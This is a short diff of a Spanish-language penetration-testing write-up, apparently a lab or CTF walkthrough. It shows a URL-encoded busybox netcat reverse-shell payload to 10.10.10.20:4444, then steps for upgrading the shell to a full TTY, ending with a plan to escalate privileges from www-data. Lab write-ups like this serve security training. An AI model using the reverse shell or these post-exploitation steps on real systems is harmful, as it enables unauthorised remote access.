@@ -139,3 +139,17 @@ busybox+nc+10.10.10.20+4444+-e+bash
 
 APLicamos la tty:
 
+```zsh
+script /dev/null -c bash
+# (Presionar CTRL+Z para suspender la shell)
+stty raw -echo; fg
+reset xterm
+export TERM=xterm && export SHELL=bash
+stty rows 29 columns 111
+```
+
+
+AHora intentaremos subir privilegios ya que somos www-data. 
+
+
+
